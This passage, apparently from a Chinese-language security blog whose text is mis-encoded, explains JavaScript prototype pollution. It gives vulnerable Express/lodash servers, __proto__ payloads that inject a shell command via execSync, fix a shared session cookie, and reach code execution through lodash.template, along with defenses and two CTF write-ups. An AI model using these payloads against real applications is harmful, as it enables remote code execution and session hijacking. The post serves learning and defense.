<p>JSä¸­çš„Objecté»˜è®¤å¸¦äº†ä¸€äº›å±æ€§,å¦‚toStringå’ŒvalueOf,åˆ©ç”¨åŸå‹é“¾æ±¡æŸ“ä»–ä»¬,å¯èƒ½å¯¼è‡´æ•´ä¸ªç¨‹åºåœæ­¢è¿è¡Œ</p>
<pre><code>toString()å°†Objectè½¬æ¢ä¸ºå­—ç¬¦ä¸²æ ¼å¼è¿”å›,valueOf()è¿”å›æ•°å€¼æˆ–è€…boolå€¼ç­‰
</code></pre>
<p>{}<strong>proto</strong>.toString=â€œ123â€</p>
<p>{}<strong>proto</strong>.valueOf=â€œ123â€</p>
<p>server.js</p>
<pre><code class="hljs javascript"><span class="hljs-keyword">var</span> _ = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;lodash&#x27;</span>);
<span class="hljs-keyword">var</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);
<span class="hljs-keyword">var</span> app = express();
<span class="hljs-keyword">var</span> bodyParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>);

app.use(bodyParser.json(&#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;application/*+json&#x27;</span> &#125;))
app.get(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) </span>&#123;
res.send(<span class="hljs-string">&quot;Use the POST method !&quot;</span>);
&#125;);

app.post(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) </span>&#123;
_.merge(&#123;&#125;, req.body);
res.send(req.body);
&#125;);

app.listen(<span class="hljs-number">3000</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;
<span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;Example app listening on port 3000!&#x27;</span>)
&#125;);</code></pre>
<p>payload:</p>
<pre><code class="hljs json">&#123;<span class="hljs-attr">&quot;__proto__&quot;</span>:&#123;<span class="hljs-attr">&quot;toString&quot;</span>:<span class="hljs-string">&quot;123&quot;</span>,<span class="hljs-attr">&quot;valueOf&quot;</span>:<span class="hljs-string">&quot;It works !&quot;</span>&#125;&#125;</code></pre>
<h4 id="forå¾ªç¯æ±¡æŸ“"><a class="header-anchor" href="#forå¾ªç¯æ±¡æŸ“">ğŸ­</a>forå¾ªç¯æ±¡æŸ“</h4>
<p>å°±åƒä¸‹é¢çš„forå¾ªç¯,å¦‚æœcommandsé‡Œé¢æœ‰,å°±å¯ä»¥æ‰§è¡Œæ¶æ„ä»£ç ,æ±¡æŸ“ç­‰</p>
<pre><code class="hljs javascript"><span class="hljs-keyword">var</span> execSync = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).execSync;

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">runJobs</span>(<span class="hljs-params"></span>) </span>&#123;
	<span class="hljs-keyword">var</span> commands = &#123;
	<span class="hljs-string">&quot;script-1&quot;</span> : <span class="hljs-string">&quot;/bin/bash /opt/my-script-1.sh&quot;</span>,
	<span class="hljs-string">&quot;script-2&quot;</span> : <span class="hljs-string">&quot;/bin/bash /opt/my-script-2.sh&quot;</span>
	&#125;;

	<span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> scriptname <span class="hljs-keyword">in</span> commands) &#123;
		<span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;Executing &quot;</span> + scriptname);
		execSync(commands[scriptname]);
	&#125;
&#125;</code></pre>
<p>payloadï¼š</p>
<pre><code class="hljs jboss-cli">&#123;    â€œ__proto__â€:&#123;â€œmy malicious <span class="hljs-keyword">command</span>â€:â€<span class="hljs-keyword">echo</span> yay &gt; <span class="hljs-string">/tmp/evil</span>â€&#125;&#125;</code></pre>
<h4 id="å±æ€§æ³¨å…¥"><a class="header-anchor" href="#å±æ€§æ³¨å…¥">ğŸ­</a>å±æ€§æ³¨å…¥</h4>
<p>æ³¨æ„åˆ°,å¦‚æœæ±¡æŸ“äº†æŸä¸ªç±»çš„prototype,é‚£ä¹ˆé‚£äº›æ²¡æœ‰è¢«æ˜¾å¼å®šä¹‰çš„å¯¹è±¡éƒ½ä¼šå—åˆ°å½±å“.</p>
<p>NodeJS çš„ httpæ¨¡å—æ”¯æŒå¾ˆå¤šheaderåŒä¸€ä¸ªname.</p>
<p>æ‰€ä»¥å¦‚æœæ±¡æŸ“äº†å¦‚cookieç­‰.ä¼šé€ æˆå¾ˆæœ‰æ„æ€çš„æ”»å‡».å¯èƒ½å¯¼è‡´æ‰€æœ‰ç”¨æˆ·å…¬ç”¨ä¸€ä¸ªsession</p>
<pre><code class="hljs routeros">&#123;â€œ__proto__â€:&#123;â€œcookieâ€:â€<span class="hljs-attribute">sess</span>=fixedsessionid; <span class="hljs-attribute">garbage</span>=â€&#125;&#125;</code></pre>
<h2 id="é˜²å¾¡"><a class="header-anchor" href="#é˜²å¾¡">ğŸ­</a>é˜²å¾¡</h2>
<h4 id="åŸå‹å†»ç»“"><a class="header-anchor" href="#åŸå‹å†»ç»“">ğŸ­</a>åŸå‹å†»ç»“</h4>
<p>ECMAScript5æ ‡å‡†ä¸­æ·»åŠ çš„ä¸€ä¸ªç‰¹æ€§.ä½¿ç”¨è¯¥ç‰¹æ€§å,å¯¹äºå¯¹è±¡å±æ€§çš„ä¿®æ”¹éƒ½å°†å¤±è´¥</p>
<p>eg:Object.freeze() å†»ç»“å¯¹è±¡, å†»ç»“çš„å¯¹è±¡æ— æ³•å†æ›´æ”¹.æˆ‘ä»¬æ— æ³•æ·»åŠ ï¼Œç¼–è¾‘æˆ–åˆ é™¤å…¶ä¸­çš„å±æ€§</p>
<pre><code class="hljs pgsql"><span class="hljs-keyword">Object</span>.<span class="hljs-keyword">freeze</span>(<span class="hljs-keyword">Object</span>.prototype);
<span class="hljs-keyword">Object</span>.<span class="hljs-keyword">freeze</span>(<span class="hljs-keyword">Object</span>);
(&#123;&#125;).__proto__.test = <span class="hljs-number">123</span>
(&#123;&#125;).test // this will be undefined</code></pre>
<h4 id="Schema-validation-of-JSON-input"><a class="header-anchor" href="#Schema-validation-of-JSON-input">ğŸ­</a>Schema validation of JSON input</h4>
<p>NPMä¸Šçš„å¤šä¸ªåº“(ä¾‹å¦‚:avj)éƒ½ä¸ºJSONæ•°æ®æä¾›äº†æ¨¡å¼éªŒè¯,å¯ä»¥åœ¨jsonè§„åˆ™é‡Œæ·»åŠ additionalProperties=false</p>
<h4 id="ä½¿ç”¨MAPä»£æ›¿Object"><a class="header-anchor" href="#ä½¿ç”¨MAPä»£æ›¿Object">ğŸ­</a>ä½¿ç”¨MAPä»£æ›¿Object</h4>
<p>MAPæ˜¯EcmaScript 6æ ‡å‡†ä¸­æ–°å¢çš„,éœ€è¦ä½¿ç”¨key/valueæ¨¡å¼æ—¶,å°½é‡ç”¨MAP</p>
<pre><code class="hljs maxima"><span class="hljs-number">1.</span>jsåˆ›å»º<span class="hljs-built_in">map</span>å¯¹è±¡
<span class="hljs-built_in">var</span> <span class="hljs-built_in">map</span> = <span class="hljs-built_in">new</span> Map();
<span class="hljs-number">2</span>.å°†é”®å€¼å¯¹æ”¾å…¥<span class="hljs-built_in">map</span>å¯¹è±¡
<span class="hljs-built_in">map</span>.set(<span class="hljs-string">&quot;key&quot;</span>,value)
<span class="hljs-built_in">map</span>.set(<span class="hljs-string">&quot;key1&quot;</span>,value1)
<span class="hljs-built_in">map</span>.set(<span class="hljs-string">&quot;key2&quot;</span>,value2)
<span class="hljs-number">3</span>.æ ¹æ®<span class="hljs-built_in">key</span>è·å–<span class="hljs-built_in">map</span>å€¼
<span class="hljs-built_in">map</span>.<span class="hljs-built_in">get</span>(<span class="hljs-built_in">key</span>)
<span class="hljs-number">4</span>.åˆ é™¤<span class="hljs-built_in">map</span>æŒ‡å®šå¯¹è±¡
<span class="hljs-built_in">delete</span> <span class="hljs-built_in">map</span>[<span class="hljs-built_in">key</span>]
æˆ–
<span class="hljs-built_in">map</span>.<span class="hljs-built_in">delete</span>(<span class="hljs-built_in">key</span>)
<span class="hljs-number">5</span>.å¾ªç¯éå†<span class="hljs-built_in">map</span>
<span class="hljs-built_in">map</span>.forEach(function(<span class="hljs-built_in">key</span>)&#123;
ã€€ã€€console.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;key&quot;</span>,<span class="hljs-built_in">key</span>)  //è¾“å‡ºçš„æ˜¯<span class="hljs-built_in">map</span>ä¸­çš„valueå€¼
&#125;)</code></pre>
<h4 id="Object-create-null"><a class="header-anchor" href="#Object-create-null">ğŸ­</a>Object.create(null)</h4>
<p>å¯ä»¥ç”¨JavaScriptåˆ›å»ºæ²¡æœ‰ä»»ä½•åŸå‹çš„å¯¹è±¡ : Object.create(null),ç”¨Object.creatåˆ›å»ºçš„å¯¹è±¡æ²¡æœ‰__proto__å’Œconstructor ä»¥è¿™ç§æ–¹å¼åˆ›å»ºå¯¹è±¡å¯ä»¥å¸®åŠ©å‡è½»åŸå‹æ±¡æŸ“æ”»å‡»</p>
<pre><code class="hljs dart"><span class="hljs-keyword">var</span> obj = <span class="hljs-built_in">Object</span>.create(<span class="hljs-keyword">null</span>);
obj.__proto__ <span class="hljs-comment">// undefined</span>
obj.constructor <span class="hljs-comment">// undefined</span></code></pre>
<h2 id="ä¾‹é¢˜"><a class="header-anchor" href="#ä¾‹é¢˜">ğŸ­</a>ä¾‹é¢˜</h2>
<h3 id="Code-Breaking-2018-Thejs"><a class="header-anchor" href="#Code-Breaking-2018-Thejs">ğŸ­</a>Code-Breaking 2018 Thejs</h3>
<p>æºç ï¼š</p>
<p><img src="/2021/04/18/js/2.png" srcset="/img/loading.gif" alt="2"></p>
<p>lodashæ˜¯ä¸ºäº†å¼¥è¡¥JavaScriptåŸç”Ÿå‡½æ•°åŠŸèƒ½ä¸è¶³è€Œæä¾›çš„ä¸€ä¸ªè¾…åŠ©åŠŸèƒ½é›†ï¼Œå…¶ä¸­åŒ…å«å­—ç¬¦ä¸²ã€æ•°ç»„ã€å¯¹è±¡ç­‰æ“ä½œã€‚è¿™ä¸ªWebåº”ç”¨ä¸­ï¼Œä½¿ç”¨äº†lodashæä¾›çš„ä¸¤ä¸ªå·¥å…·ï¼š</p>
<ul>
<li><code>lodash.template</code> ä¸€ä¸ªç®€å•çš„æ¨¡æ¿å¼•æ“</li>
<li><code>lodash.merge</code> å‡½æ•°æˆ–å¯¹è±¡çš„åˆå¹¶</li>
</ul>
<p>åº”ç”¨é€»è¾‘ï¼šç”¨æˆ·æäº¤çš„ä¿¡æ¯ï¼Œç”¨mergeæ–¹æ³•åˆå¹¶åˆ°sessioné‡Œï¼Œå¤šæ¬¡æäº¤ï¼Œsessioné‡Œæœ€ç»ˆä¿å­˜æäº¤çš„æ‰€æœ‰ä¿¡æ¯ã€‚è¿™é‡Œçš„<code>lodash.merge</code>æ“ä½œå°±å­˜åœ¨åŸå‹é“¾æ±¡æŸ“æ¼æ´ã€‚</p>
<p>åœ¨æ±¡æŸ“åŸå‹é“¾åï¼Œæˆ‘ä»¬ç›¸å½“äºå¯ä»¥ç»™Objectå¯¹è±¡æ’å…¥ä»»æ„å±æ€§ï¼Œè¿™ä¸ªæ’å…¥çš„å±æ€§ååº”åœ¨æœ€åçš„<code>lodash.template</code>ä¸­ã€‚<code>lodash.template</code>çš„ä»£ç ï¼š<a target="_blank" rel="noopener" href="https://github.com/lodash/lodash/blob/4.17.4-npm/template.js#L165">https://github.com/lodash/lodash/blob/4.17.4-npm/template.js#L165</a></p>
<pre><code class="hljs php"><span class="hljs-comment">// Use a sourceURL for easier debugging.</span>
<span class="hljs-keyword">var</span> sourceURL = <span class="hljs-string">&#x27;sourceURL&#x27;</span> in options ? <span class="hljs-string">&#x27;//# sourceURL=&#x27;</span> + options.sourceURL + <span class="hljs-string">&#x27;\n&#x27;</span> : <span class="hljs-string">&#x27;&#x27;</span>;
<span class="hljs-comment">// ...</span>
<span class="hljs-keyword">var</span> result = attempt(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;
  <span class="hljs-keyword">return</span> <span class="hljs-function"><span class="hljs-keyword">Function</span>(<span class="hljs-params">importsKeys, sourceURL + <span class="hljs-string">&#x27;return &#x27;</span> + source</span>)</span>
<span class="hljs-function">  .<span class="hljs-title">apply</span>(<span class="hljs-params">undefined, importsValues</span>)</span>;
&#125;);</code></pre>
<p>optionsæ˜¯ä¸€ä¸ªå¯¹è±¡ï¼ŒsourceURLå–åˆ°äº†å…¶<code>options.sourceURL</code>å±æ€§ã€‚è¿™ä¸ªå±æ€§åŸæœ¬æ˜¯æ²¡æœ‰èµ‹å€¼çš„ï¼Œé»˜è®¤å–ç©ºå­—ç¬¦ä¸²ã€‚æˆ‘ä»¬å¯ä»¥ç»™æ‰€æœ‰Objectå¯¹è±¡ä¸­éƒ½æ’å…¥ä¸€ä¸ª<code>sourceURL</code>å±æ€§ã€‚æœ€åï¼Œè¿™ä¸ª<code>sourceURL</code>è¢«æ‹¼æ¥è¿›<code>new Function</code>çš„ç¬¬äºŒä¸ªå‚æ•°ä¸­ï¼Œé€ æˆä»»æ„ä»£ç æ‰§è¡Œæ¼æ´ã€‚å°†å¸¦æœ‰<code>__proto__</code>çš„Payloadä»¥jsonçš„å½¢å¼å‘é€ç»™åç«¯ï¼Œå› ä¸ºexpressæ¡†æ¶æ”¯æŒæ ¹æ®Content-Typeæ¥è§£æè¯·æ±‚Bodyï¼š</p>
<p><img src="/2021/04/18/js/3.png" srcset="/img/loading.gif" alt="3"></p>
<p>è¿”å›äº†idå‘½ä»¤ã€‚</p>
<h3 id="hackit-2018"><a class="header-anchor" href="#hackit-2018">ğŸ­</a>hackit 2018</h3>
<p>æºç :</p>
<pre><code class="hljs yaml"><span class="hljs-string">const</span> <span class="hljs-string">express</span> <span class="hljs-string">=</span> <span class="hljs-string">require(&#x27;express&#x27;)</span>         <span class="hljs-string">//å…³äºrequireï¼Œrequireæ˜¯ä¸€ä¸ªå‡½æ•°</span>
<span class="hljs-string">var</span> <span class="hljs-string">hbs</span> <span class="hljs-string">=</span> <span class="hljs-string">require(&#x27;hbs&#x27;);</span>
<span class="hljs-string">var</span> <span class="hljs-string">bodyParser</span> <span class="hljs-string">=</span> <span class="hljs-string">require(&#x27;body-parser&#x27;);</span>
<span class="hljs-string">const</span> <span class="hljs-string">md5</span> <span class="hljs-string">=</span> <span class="hljs-string">require(&#x27;md5&#x27;);</span>
<span class="hljs-string">var</span> <span class="hljs-string">morganBody</span> <span class="hljs-string">=</span> <span class="hljs-string">require(&#x27;morgan-body&#x27;);</span>
<span class="hljs-string">const</span> <span class="hljs-string">app</span> <span class="hljs-string">=</span> <span class="hljs-string">express();</span>
<span class="hljs-string">var</span> <span class="hljs-string">user</span> <span class="hljs-string">=</span> []<span class="hljs-string">;</span> <span class="hljs-string">//empty</span> <span class="hljs-string">for</span> <span class="hljs-string">now</span>

<span class="hljs-string">var</span> <span class="hljs-string">matrix</span> <span class="hljs-string">=</span> []<span class="hljs-string">;</span>
<span class="hljs-string">for</span> <span class="hljs-string">(var</span> <span class="hljs-string">i</span> <span class="hljs-string">=</span> <span class="hljs-number">0</span><span class="hljs-string">;</span> <span class="hljs-string">i</span> <span class="hljs-string">&lt;</span> <span class="hljs-number">3</span><span class="hljs-string">;</span> <span class="hljs-string">i++)&#123;</span>
    <span class="hljs-string">matrix[i]</span> <span class="hljs-string">=</span> [<span class="hljs-literal">null</span> , <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>]<span class="hljs-string">;</span>
<span class="hljs-string">&#125;</span>

<span class="hljs-string">function</span> <span class="hljs-string">draw(mat)</span> &#123;
    <span class="hljs-string">var</span> <span class="hljs-string">count</span> <span class="hljs-string">=</span> <span class="hljs-number">0</span><span class="hljs-string">;</span>
    <span class="hljs-string">for</span> <span class="hljs-string">(var</span> <span class="hljs-string">i</span> <span class="hljs-string">=</span> <span class="hljs-number">0</span><span class="hljs-string">;</span> <span class="hljs-string">i</span> <span class="hljs-string">&lt;</span> <span class="hljs-number">3</span><span class="hljs-string">;</span> <span class="hljs-string">i++)</span>&#123;
        <span class="hljs-string">for</span> <span class="hljs-string">(var</span> <span class="hljs-string">j</span> <span class="hljs-string">=</span> <span class="hljs-number">0</span><span class="hljs-string">;</span> <span class="hljs-string">j</span> <span class="hljs-string">&lt;</span> <span class="hljs-number">3</span><span class="hljs-string">;</span> <span class="hljs-string">j++)</span>&#123;
            <span class="hljs-string">if</span> <span class="hljs-string">(matrix</span>[<span class="hljs-string">i</span>][<span class="hljs-string">j</span>] <span class="hljs-type">!==</span> <span class="hljs-literal">null</span><span class="hljs-string">)</span>&#123;
                <span class="hljs-string">count</span> <span class="hljs-string">+=</span> <span class="hljs-number">1</span><span class="hljs-string">;</span>
            &#125;
        &#125;
    &#125;
    <span class="hljs-string">return</span> <span class="hljs-string">count</span> <span class="hljs-string">===</span> <span class="hljs-number">9</span><span class="hljs-string">;</span>
&#125;

<span class="hljs-string">app.use(express.static(&#x27;public&#x27;));</span>
<span class="hljs-string">app.use(bodyParser.json());</span>
<span class="hljs-string">app.set(&#x27;view</span> <span class="hljs-string">engine&#x27;,</span> <span class="hljs-string">&#x27;html&#x27;</span><span class="hljs-string">);</span>
<span class="hljs-string">morganBody(app);</span>
<span class="hljs-string">app.engine(&#x27;html&#x27;,</span> <span class="hljs-string">require(&#x27;hbs&#x27;).__express);</span>

<span class="hljs-string">app.get(&#x27;/&#x27;,</span> <span class="hljs-string">(req,</span> <span class="hljs-string">res)</span> <span class="hljs-string">=&gt;</span> &#123;

    <span class="hljs-string">for</span> <span class="hljs-string">(var</span> <span class="hljs-string">i</span> <span class="hljs-string">=</span> <span class="hljs-number">0</span><span class="hljs-string">;</span> <span class="hljs-string">i</span> <span class="hljs-string">&lt;</span> <span class="hljs-number">3</span><span class="hljs-string">;</span> <span class="hljs-string">i++)</span>&#123;
        <span class="hljs-string">matrix</span>[<span class="hljs-string">i</span>] <span class="hljs-string">=</span> [<span class="hljs-literal">null</span> , <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>]<span class="hljs-string">;</span>

    &#125;
    <span class="hljs-string">res.render(&#x27;index&#x27;);</span>
&#125;<span class="hljs-string">)</span>


<span class="hljs-string">app.get(&#x27;/admin&#x27;,</span> <span class="hljs-string">(req,</span> <span class="hljs-string">res)</span> <span class="hljs-string">=&gt;</span> &#123; 
    <span class="hljs-string">/*this</span> <span class="hljs-string">is</span> <span class="hljs-string">under</span> <span class="hljs-string">development</span> <span class="hljs-string">I</span> <span class="hljs-string">guess</span> <span class="hljs-string">??*/</span>
    <span class="hljs-string">console.log(user.admintoken);</span>
    <span class="hljs-string">if(user.admintoken</span> <span class="hljs-string">&amp;&amp;</span> <span class="hljs-string">req.query.querytoken</span> <span class="hljs-string">&amp;&amp;</span> <span class="hljs-string">md5(user.admintoken)</span> <span class="hljs-string">===</span> <span class="hljs-string">req.query.querytoken)</span>&#123;
        <span class="hljs-string">res.send(&#x27;Hey</span> <span class="hljs-string">admin</span> <span class="hljs-string">your</span> <span class="hljs-string">flag</span> <span class="hljs-string">is</span> <span class="hljs-string">&lt;b&gt;flag</span>&#123;<span class="hljs-string">prototype_pollution_is_very_dangerous</span>&#125;<span class="hljs-string">&lt;/b&gt;&#x27;);</span>
    &#125; 
    <span class="hljs-string">else</span> &#123;
        <span class="hljs-string">res.status(403).send(&#x27;Forbidden&#x27;);</span>
    &#125;    
&#125;
<span class="hljs-string">)</span>


<span class="hljs-string">app.post(&#x27;/api&#x27;,</span> <span class="hljs-string">(req,</span> <span class="hljs-string">res)</span> <span class="hljs-string">=&gt;</span> &#123;
    <span class="hljs-string">var</span> <span class="hljs-string">client</span> <span class="hljs-string">=</span> <span class="hljs-string">req.body;</span>
    <span class="hljs-string">var</span> <span class="hljs-string">winner</span> <span class="hljs-string">=</span> <span class="hljs-literal">null</span><span class="hljs-string">;</span>

    <span class="hljs-string">if</span> <span class="hljs-string">(client.row</span> <span class="hljs-string">&gt;</span> <span class="hljs-number">3</span> <span class="hljs-string">||</span> <span class="hljs-string">client.col</span> <span class="hljs-string">&gt;</span> <span class="hljs-number">3</span><span class="hljs-string">)</span>&#123;
        <span class="hljs-string">client.row</span> <span class="hljs-string">%=</span> <span class="hljs-number">3</span><span class="hljs-string">;</span>
        <span class="hljs-string">client.col</span> <span class="hljs-string">%=</span> <span class="hljs-number">3</span><span class="hljs-string">;</span>
    &#125;
    <span class="hljs-string">matrix</span>[<span class="hljs-string">client.row</span>][<span class="hljs-string">client.col</span>] <span class="hljs-string">=</span> <span class="hljs-string">client.data;</span>
    <span class="hljs-string">for(var</span> <span class="hljs-string">i</span> <span class="hljs-string">=</span> <span class="hljs-number">0</span><span class="hljs-string">;</span> <span class="hljs-string">i</span> <span class="hljs-string">&lt;</span> <span class="hljs-number">3</span><span class="hljs-string">;</span> <span class="hljs-string">i++)</span>&#123;
        <span class="hljs-string">if</span> <span class="hljs-string">(matrix</span>[<span class="hljs-string">i</span>][<span class="hljs-number">0</span>] <span class="hljs-string">===</span> <span class="hljs-string">matrix</span>[<span class="hljs-string">i</span>][<span class="hljs-number">1</span>] <span class="hljs-string">&amp;&amp;</span> <span class="hljs-string">matrix</span>[<span class="hljs-string">i</span>][<span class="hljs-number">1</span>] <span class="hljs-string">===</span> <span class="hljs-string">matrix</span>[<span class="hljs-string">i</span>][<span class="hljs-number">2</span>] <span class="hljs-string">)</span>&#123;
            <span class="hljs-string">if</span> <span class="hljs-string">(matrix</span>[<span class="hljs-string">i</span>][<span class="hljs-number">0</span>] <span class="hljs-string">===</span> <span class="hljs-string">&#x27;X&#x27;</span><span class="hljs-string">)</span> &#123;
                <span class="hljs-string">winner</span> <span class="hljs-string">=</span> <span class="hljs-number">1</span><span class="hljs-string">;</span>
            &#125;
            <span class="hljs-string">else</span> <span class="hljs-string">if(matrix</span>[<span class="hljs-string">i</span>][<span class="hljs-number">0</span>] <span class="hljs-string">===</span> <span class="hljs-string">&#x27;O&#x27;</span><span class="hljs-string">)</span> &#123;
                <span class="hljs-string">winner</span> <span class="hljs-string">=</span> <span class="hljs-number">2</span><span class="hljs-string">;</span>
            &#125;
        &#125;
        <span class="hljs-string">if</span> <span class="hljs-string">(matrix</span>[<span class="hljs-number">0</span>][<span class="hljs-string">i</span>] <span class="hljs-string">===</span> <span class="hljs-string">matrix</span>[<span class="hljs-number">1</span>][<span class="hljs-string">i</span>] <span class="hljs-string">&amp;&amp;</span> <span class="hljs-string">matrix</span>[<span class="hljs-number">1</span>][<span class="hljs-string">i</span>] <span class="hljs-string">===</span> <span class="hljs-string">matrix</span>[<span class="hljs-number">2</span>][<span class="hljs-string">i</span>]<span class="hljs-string">)</span>&#123;
            <span class="hljs-string">if</span> <span class="hljs-string">(matrix</span>[<span class="hljs-number">0</span>][<span class="hljs-string">i</span>] <span class="hljs-string">===</span> <span class="hljs-string">&#x27;X&#x27;</span><span class="hljs-string">)</span> &#123;
                <span class="hljs-string">winner</span> <span class="hljs-string">=</span> <span class="hljs-number">1</span><span class="hljs-string">;</span>
            &#125;
            <span class="hljs-string">else</span> <span class="hljs-string">if(matrix</span>[<span class="hljs-number">0</span>][<span class="hljs-string">i</span>] <span class="hljs-string">===</span> <span class="hljs-string">&#x27;O&#x27;</span><span class="hljs-string">)</span> &#123;
                <span class="hljs-string">winner</span> <span class="hljs-string">=</span> <span class="hljs-number">2</span><span class="hljs-string">;</span>
            &#125;
        &#125;
    &#125;

    <span class="hljs-string">if</span> <span class="hljs-string">(matrix</span>[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] <span class="hljs-string">===</span> <span class="hljs-string">matrix</span>[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] <span class="hljs-string">&amp;&amp;</span> <span class="hljs-string">matrix</span>[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] <span class="hljs-string">===</span> <span class="hljs-string">matrix</span>[<span class="hljs-number">2</span>][<span class="hljs-number">2</span>] <span class="hljs-string">&amp;&amp;</span> <span class="hljs-string">matrix</span>[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] <span class="hljs-string">===</span> <span class="hljs-string">&#x27;X&#x27;</span><span class="hljs-string">)</span>&#123;
        <span class="hljs-string">winner</span> <span class="hljs-string">=</span> <span class="hljs-number">1</span><span class="hljs-string">;</span>
    &#125;
    <span class="hljs-string">if</span> <span class="hljs-string">(matrix</span>[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] <span class="hljs-string">===</span> <span class="hljs-string">matrix</span>[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] <span class="hljs-string">&amp;&amp;</span> <span class="hljs-string">matrix</span>[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] <span class="hljs-string">===</span> <span class="hljs-string">matrix</span>[<span class="hljs-number">2</span>][<span class="hljs-number">2</span>] <span class="hljs-string">&amp;&amp;</span> <span class="hljs-string">matrix</span>[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] <span class="hljs-string">===</span> <span class="hljs-string">&#x27;O&#x27;</span><span class="hljs-string">)</span>&#123;
        <span class="hljs-string">winner</span> <span class="hljs-string">=</span> <span class="hljs-number">2</span><span class="hljs-string">;</span>
    &#125; 

    <span class="hljs-string">if</span> <span class="hljs-string">(matrix</span>[<span class="hljs-number">0</span>][<span class="hljs-number">2</span>] <span class="hljs-string">===</span> <span class="hljs-string">matrix</span>[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] <span class="hljs-string">&amp;&amp;</span> <span class="hljs-string">matrix</span>[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] <span class="hljs-string">===</span> <span class="hljs-string">matrix</span>[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>] <span class="hljs-string">&amp;&amp;</span> <span class="hljs-string">matrix</span>[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>] <span class="hljs-string">===</span> <span class="hljs-string">&#x27;X&#x27;</span><span class="hljs-string">)</span>&#123;
        <span class="hljs-string">winner</span> <span class="hljs-string">=</span> <span class="hljs-number">1</span><span class="hljs-string">;</span>
    &#125;
    <span class="hljs-string">if</span> <span class="hljs-string">(matrix</span>[<span class="hljs-number">0</span>][<span class="hljs-number">2</span>] <span class="hljs-string">===</span> <span class="hljs-string">matrix</span>[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] <span class="hljs-string">&amp;&amp;</span> <span class="hljs-string">matrix</span>[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] <span class="hljs-string">===</span> <span class="hljs-string">matrix</span>[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>] <span class="hljs-string">&amp;&amp;</span> <span class="hljs-string">matrix</span>[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>] <span class="hljs-string">===</span> <span class="hljs-string">&#x27;O&#x27;</span><span class="hljs-string">)</span>&#123;
        <span class="hljs-string">winner</span> <span class="hljs-string">=</span> <span class="hljs-number">2</span><span class="hljs-string">;</span>
    &#125;

    <span class="hljs-string">if</span> <span class="hljs-string">(draw(matrix)</span> <span class="hljs-string">&amp;&amp;</span> <span class="hljs-string">winner</span> <span class="hljs-string">===</span> <span class="hljs-literal">null</span><span class="hljs-string">)</span>&#123;
        <span class="hljs-string">res.send(JSON.stringify(</span>&#123;<span class="hljs-attr">winner:</span> <span class="hljs-number">0</span>&#125;<span class="hljs-string">))</span>
    &#125;
    <span class="hljs-string">else</span> <span class="hljs-string">if</span> <span class="hljs-string">(winner</span> <span class="hljs-type">!==</span> <span class="hljs-literal">null</span><span class="hljs-string">)</span> &#123;
        <span class="hljs-string">res.send(JSON.stringify(</span>&#123;<span class="hljs-attr">winner:</span> <span class="hljs-string">winner</span>&#125;<span class="hljs-string">))</span>
    &#125;
    <span class="hljs-string">else</span> &#123;
        <span class="hljs-string">res.send(JSON.stringify(</span>&#123;<span class="hljs-attr">winner:</span> <span class="hljs-number">-1</span>&#125;<span class="hljs-string">))</span>
    &#125;

&#125;<span class="hljs-string">)</span>
<span class="hljs-string">app.listen(3000,</span> <span class="hljs-string">()</span> <span class="hljs-string">=&gt;</span> &#123;
    <span class="hljs-string">console.log(&#x27;app</span> <span class="hljs-string">listening</span> <span class="hljs-string">on</span> <span class="hljs-string">port</span> <span class="hljs-number">3000</span><span class="hljs-type">!&#x27;)</span>
&#125;<span class="hljs-string">)</span></code></pre>
<p>è·å–flagçš„æ¡ä»¶ï¼š<code>user.admintoken &amp;&amp; req.query.querytoken &amp;&amp; md5(user.admintoken) === req.query.querytoken</code>ï¼Œæºç å¹¶æ²¡æœ‰ç»™user.admintokenèµ‹å€¼ã€‚ä½†æ˜¯åœ¨apiè¿™ä¸ªæ¥å£çš„åœ°æ–¹ï¼Œæ˜¯å¯ä»¥æ¥æ”¶dataï¼Œrowï¼Œcolæ‰€ä»¥æ­¤æ—¶æˆ‘ä»¬å¯ä»¥è¿›è¡ŒåŸå‹é“¾æ±¡æŸ“</p>
<pre><code class="hljs markdown">matrix[<span class="hljs-string">client.row</span>][<span class="hljs-symbol">client.col</span>] = client.data</code></pre>
<p>client.rowè®¾ç½®ä¸º<code>__proto__</code>å³å¯ï¼Œå†å°†colè®¾ä¸ºadmintokenï¼Œæ­¤æ—¶dataå°±æ˜¯æˆ‘ä»¬è®¾ç½®çš„å€¼äº†ã€‚</p>
<p>æ­¤æ—¶åœ¨adminè·¯ç”±å¤„ä¼ å…¥querytoken</p>
<p><img src="/2021/04/18/js/4.jpg" srcset="/img/loading.gif" alt="4"></p>
